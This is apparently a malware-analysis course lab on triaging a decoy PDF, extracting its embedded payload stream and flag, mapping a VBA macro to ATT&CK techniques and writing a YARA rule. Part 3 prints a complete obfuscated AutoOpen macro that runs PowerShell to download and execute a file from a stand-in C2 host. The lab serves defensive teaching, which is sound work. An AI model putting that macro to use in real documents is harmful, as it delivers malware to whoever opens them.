# Lab 09 — Document Malware Analysis

**Module:** 09 — Document Malware Analysis  
**Estimated time:** 60–90 minutes  
**Difficulty:** Intermediate  
**Flag:** `FLAG{pdf_stream_decoded_embedded_payload_found}`

---

## Objectives

- Triage a suspicious PDF using pdfid without opening it
- Extract and decompress an embedded payload stream
- Identify suspicious OLE/VBA macro keywords in a Word document
- Map findings to ATT&CK techniques
- Write a YARA rule for document-based threats

---

## Setup

```bash
pip3 install pdfid pdf-parser oletools --break-system-packages
mkdir -p ~/labs/lab09
cd ~/labs/lab09

# Generate the decoy PDF sample
python3 ~/course/samples/generate_decoy_pdf.py
mv decoy_invoice.pdf ~/labs/lab09/
```

---

## Part 1 — PDF Triage

**Task 1.1** — Hash before touching:

```bash
sha256sum ~/labs/lab09/decoy_invoice.pdf
```

**Task 1.2** — File type confirmation:

```bash
file ~/labs/lab09/decoy_invoice.pdf
```

**Task 1.3** — pdfid keyword triage:

```bash
python3 -m pdfid ~/labs/lab09/decoy_invoice.pdf
```

List every keyword with a non-zero count. Mark each as RED FLAG, WORTH INVESTIGATING or BENIGN based on the module content.

**Task 1.4** — Quick string search for network IOCs:

```bash
strings ~/labs/lab09/decoy_invoice.pdf | grep -iE "http|ftp|://|\.exe|\.bin|powershell"
```

---

## Part 2 — Deep PDF Inspection

**Task 2.1** — List all objects:

```bash
python3 -m pdf-parser ~/labs/lab09/decoy_invoice.pdf 2>/dev/null | head -60
```

Note the object numbers and types. Which object contains `/EmbeddedFile`?

**Task 2.2** — Extract the JavaScript object:

```bash
python3 -m pdf-parser --search javascript ~/labs/lab09/decoy_invoice.pdf 2>/dev/null
```

What does the JavaScript actually do? Is it malicious or benign?

**Task 2.3** — Find and extract the embedded file stream. Replace `7` with the actual EmbeddedFile object number you found:

```bash
python3 -m pdf-parser --object 7 --filter ~/labs/lab09/decoy_invoice.pdf 2>/dev/null > ~/labs/lab09/extracted.bin
file ~/labs/lab09/extracted.bin
strings ~/labs/lab09/extracted.bin
```

> **CTFd Flag:** Read the extracted content. The flag is embedded in the payload.

**Task 2.4** — Check the PDF metadata:

```bash
strings ~/labs/lab09/decoy_invoice.pdf | grep -iE "author|creator|producer|title|keyword"
```

Does the metadata match what you would expect from a legitimate invoice? What inconsistencies do you see?

---

## Part 3 — Simulated VBA Analysis

Real Office macro analysis requires `.docm` files. For this lab, analyse a simulated VBA snippet:

**Task 3.1** — Save this to `~/labs/lab09/simulated_macro.vba` and analyse it:

```vba
' simulated_macro.vba — For training analysis only
' This represents a typical malicious Word macro structure

Private Sub AutoOpen()
    ' AutoOpen = runs when document is opened
    Dim strCmd As String
    Dim strUrl As String

    ' String obfuscation using Chr() concatenation
    strUrl = Chr(104) & Chr(116) & Chr(116) & Chr(112) & _
             Chr(58) & Chr(47) & Chr(47) & "example-c2.com" & _
             Chr(47) & "payload.exe"
    ' Decoded: http://example-c2.com/payload.exe

    ' Create WScript.Shell to run commands
    Dim oShell As Object
    Set oShell = CreateObject("WScript" & "." & "Shell")

    ' Download and execute payload
    strCmd = "pow" & "ersh" & "ell -ep bypass -c " & _
             "(New-Object Net.WebClient).DownloadFile('" & _
             strUrl & "','%TEMP%\update.exe');Start-Process '%TEMP%\update.exe'"

    oShell.Run strCmd, 0, False
    Set oShell = Nothing
End Sub
```

**Task 3.2** — Manually deobfuscate the Chr() sequences:

```python
python3 -c "
chars = [104,116,116,112,58,47,47]
print('URL prefix:', ''.join(chr(c) for c in chars))
"
```

What is the full download URL?

**Task 3.3** — Identify every ATT&CK technique in this macro. Fill in the table:

| Code Element | ATT&CK ID | Technique Name |
|---|---|---|
| `AutoOpen` | T1204.002 | User Execution: Malicious File |
| `CreateObject("WScript.Shell")` | `T____` | |
| `DownloadFile(...)` | `T____` | |
| `Chr()` obfuscation | `T____` | |
| String concatenation on "powershell" | `T____` | |

---

## Part 4 — YARA Rule for Document Threats

**Task 4.1** — Write a YARA rule that detects the decoy PDF based on its suspicious structure:

```yara
rule Suspicious_PDF_Embedded_JS {
    meta:
        description = "Detects PDF with JavaScript and embedded file"
        author      = "Your name"
        date        = "2026-03-01"
        reference   = "Lab 09"
    strings:
        // Add string patterns from your pdfid findings
        $js1   = "/JavaScript" ascii
        $js2   = "/JS" ascii
        $oa    = "/OpenAction" ascii
        $embed = "/EmbeddedFile" ascii
        $mz    = "MZ" ascii  // PE inside the PDF
    condition:
        // PDF magic bytes
        (uint8(0) == 0x25 and uint8(1) == 0x50) and  // %P
        // Requires both JS and an action
        ($js1 or $js2) and
        $oa and
        $embed
}
```

**Task 4.2** — Test it:

```bash
yara ~/labs/lab09/suspicious_pdf.yar ~/labs/lab09/decoy_invoice.pdf
```

---

## Completion Checklist

- [ ] PDF hashed before analysis
- [ ] pdfid output documented, all suspicious keywords noted
- [ ] JavaScript object extracted and read
- [ ] Embedded file stream extracted and decoded
- [ ] Flag found and submitted
- [ ] PDF metadata inconsistencies documented
- [ ] VBA Chr() obfuscation manually decoded
- [ ] ATT&CK mapping table completed (5 techniques)
- [ ] YARA rule written and tested

## Key Takeaway

Document malware is the most common initial access vector against the people you protect. The entire analysis workflow here — hash, triage with pdfid, extract streams, read content, map to ATT&CK — takes under 10 minutes on a real sample. Those 10 minutes are the difference between catching a threat before it executes and responding to a full compromise after the fact.

**Next:** [Module 08 Case Study](../modules/08_case_study.md) applies all techniques including document analysis to a complete incident.
